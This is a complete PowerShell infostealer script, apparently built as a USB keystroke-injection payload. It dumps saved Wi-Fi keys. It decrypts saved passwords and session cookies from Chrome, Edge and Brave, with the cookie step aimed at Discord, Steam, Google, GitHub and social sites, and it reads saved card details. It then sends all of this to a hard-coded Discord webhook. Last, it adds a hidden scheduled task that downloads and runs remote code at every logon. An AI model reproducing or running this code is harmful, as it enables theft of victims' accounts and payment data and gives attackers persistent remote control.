try {
    $out = "$env:TEMP\acidburn_dump.txt"
    "=== ACID BURN ===" | Out-File $out
    "Host: $env:COMPUTERNAME" | Out-File $out -Append
    "User: $env:USERNAME" | Out-File $out -Append
    "Time: $(Get-Date)" | Out-File $out -Append
    "PS: $($PSVersionTable.PSVersion)" | Out-File $out -Append
    "" | Out-File $out -Append

    # --- SAVED WIFI ---
    "--- SAVED WIFI ---" | Out-File $out -Append
    try {
        $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }
        foreach ($p in $profiles) {
            $detail = netsh wlan show profile name="$p" key=clear
            $key = ($detail | Select-String "Key Content") -replace ".*:\s*", ""
            "$p : $key" | Out-File $out -Append
        }
    } catch { "wifi error: $_" | Out-File $out -Append }
    "" | Out-File $out -Append

    # --- LOAD SQLITE ---
    $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
    if (-not (Test-Path $sqliteDll)) {
        try { Invoke-WebRequest "https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/System.Data.SQLite.dll" -OutFile $sqliteDll -UseBasicParsing } catch { }
    }
    $sqliteLoaded = $false
    if (Test-Path $sqliteDll) {
        try { [System.Reflection.Assembly]::LoadFrom($sqliteDll) | Out-Null; $sqliteLoaded = $true } catch { }
    }

    Add-Type -AssemblyName System.Security

    # --- DECRYPT HELPERS ---
    function Decrypt-Blob {
        param([byte[]]$Blob, [byte[]]$Key)
        if (-not $Blob -or $Blob.Length -eq 0) { return "" }
        try {
            if ($Blob.Length -gt 15 -and $Blob[0] -eq 118 -and $Blob[1] -eq 49 -and $Blob[2] -eq 48) {
                $nonce  = $Blob[3..14]
                $cipher = $Blob[15..($Blob.Length-17)]
                $tag    = $Blob[($Blob.Length-16)..($Blob.Length-1)]
                $gcm = New-Object System.Security.Cryptography.AesGcm($Key)
                $plain = New-Object byte[] $cipher.Length
                $gcm.Decrypt($nonce, $cipher, $tag, $plain)
                $gcm.Dispose()
                return [System.Text.Encoding]::UTF8.GetString($plain)
            } else {
                $plain = [System.Security.Cryptography.ProtectedData]::Unprotect($Blob, $null, 'CurrentUser')
                return [System.Text.Encoding]::UTF8.GetString($plain)
            }
        } catch { return "" }
    }

    function Get-BrowserKey {
        param([string]$LocalStatePath)
        if (-not (Test-Path $LocalStatePath)) { return $null }
        try {
            $ls = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
            $encKey = $encKey[5..($encKey.Length-1)]
            return [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
        } catch { return $null }
    }

    function Copy-LockedFile {
        param([string]$Src, [string]$Dst)
        for ($i = 0; $i -lt 5; $i++) {
            try {
                Copy-Item $Src $Dst -Force -ErrorAction Stop
                return $true
            } catch { Start-Sleep -Milliseconds 200 }
        }
        return $false
    }

    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    }

    # --- CARDS ---
    "--- SAVED CARDS ---" | Out-File $out -Append
    foreach ($b in $browsers.Keys) {
        $base = $browsers[$b]
        if (-not (Test-Path $base)) { continue }
        "== $b ==" | Out-File $out -Append
        $profilesDir = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^(Default|Profile)" }
        foreach ($pd in $profilesDir) {
            $webDb = Join-Path $pd.FullName "Web Data"
            if (-not (Test-Path $webDb) -or -not $sqliteLoaded) { continue }
            $tmp = "$env:TEMP\ab_web.db"
            if (-not (Copy-LockedFile $webDb $tmp)) { "  web db locked" | Out-File $out -Append; continue }
            try {
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                foreach ($tbl in @("credit_cards","masked_credit_cards")) {
                    try {
                        $cmd.CommandText = "SELECT COUNT(*) FROM $tbl"
                        $n = $cmd.ExecuteScalar()
                        "  [$tbl] $n rows" | Out-File $out -Append
                        if ($n -gt 0) {
                            if ($tbl -eq "credit_cards") {
                                $cmd.CommandText = "SELECT name_on_card, expiration_month, expiration_year FROM credit_cards"
                            } else {
                                $cmd.CommandText = "SELECT nickname, name_on_card, last_four, exp_month, exp_year FROM masked_credit_cards"
                            }
                            $r = $cmd.ExecuteReader()
                            while ($r.Read()) {
                                $vals = @()
                                for ($i = 0; $i -lt $r.FieldCount; $i++) { $vals += "$($r.GetValue($i))" }
                                "    $($vals -join ' | ')" | Out-File $out -Append
                            }
                            $r.Close()
                        }
                    } catch { "  [$tbl] err" | Out-File $out -Append }
                }
                $conn.Close()
            } catch { }
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    }
    "" | Out-File $out -Append

    # --- PASSWORDS ---
    "--- PASSWORDS ---" | Out-File $out -Append
    foreach ($b in $browsers.Keys) {
        $base = $browsers[$b]
        if (-not (Test-Path $base)) { continue }
        $key = Get-BrowserKey (Join-Path $base "Local State")
        if (-not $key) { continue }
        $profilesDir = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^(Default|Profile)" }
        foreach ($pd in $profilesDir) {
            $loginDb = Join-Path $pd.FullName "Login Data"
            if (-not (Test-Path $loginDb)) { continue }
            $tmp = "$env:TEMP\ab_login.db"
            if (-not (Copy-LockedFile $loginDb $tmp)) { continue }
            try {
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 0"
                $r = $cmd.ExecuteReader()
                while ($r.Read()) {
                    $pw = Decrypt-Blob $r.GetValue(2) $key
                    if ($pw) { "[$b] $($r.GetValue(0)) | $($r.GetValue(1)) | $pw" | Out-File $out -Append }
                }
                $r.Close(); $conn.Close()
            } catch { }
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    }
    "" | Out-File $out -Append

    # --- COOKIES ---
    "--- COOKIES ---" | Out-File $out -Append
    foreach ($b in $browsers.Keys) {
        $base = $browsers[$b]
        if (-not (Test-Path $base)) { continue }
        $key = Get-BrowserKey (Join-Path $base "Local State")
        if (-not $key) { continue }
        $profilesDir = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^(Default|Profile)" }
        foreach ($pd in $profilesDir) {
            $cookieDb = Join-Path $pd.FullName "Network\Cookies"
            if (-not (Test-Path $cookieDb)) { continue }
            $tmp = "$env:TEMP\ab_cookies.db"
            if (-not (Copy-LockedFile $cookieDb $tmp)) { continue }
            try {
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%discord%' OR host_key LIKE '%steam%' OR host_key LIKE '%google%' OR host_key LIKE '%github%' OR host_key LIKE '%x.com%' OR host_key LIKE '%twitter%' OR host_key LIKE '%instagram%'"
                $r = $cmd.ExecuteReader()
                while ($r.Read()) {
                    $val = $r.GetValue(2)
                    if (-not $val) { $val = Decrypt-Blob $r.GetValue(3) $key }
                    if ($val) { "[$b] $($r.GetValue(0)) | $($r.GetValue(1)) = $val" | Out-File $out -Append }
                }
                $r.Close(); $conn.Close()
            } catch { }
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    }
    "" | Out-File $out -Append

    # --- EXFIL (chunked) ---
    $url = "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT"
    $lines = Get-Content $out
    $chunk = ""
    foreach ($line in $lines) {
        if (($chunk.Length + $line.Length) -gt 1800) {
            $payload = @{ content = $chunk } | ConvertTo-Json -Compress
            try { Invoke-RestMethod -Uri $url -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($payload)) -ContentType "application/json; charset=utf-8" } catch { }
            Start-Sleep -Milliseconds 350
            $chunk = ""
        }
        $chunk += "$line`n"
    }
    if ($chunk) {
        $payload = @{ content = $chunk } | ConvertTo-Json -Compress
        try { Invoke-RestMethod -Uri $url -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($payload)) -ContentType "application/json; charset=utf-8" } catch { }
    }

    # --- PERSISTENCE ---
    $pcmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/x.ps1')`""
    schtasks /create /tn "AcidBurn" /tr $pcmd /sc onlogon /f 2>$null
}
catch {
    $_ | Out-File "$env:TEMP\ab_error.txt"
}
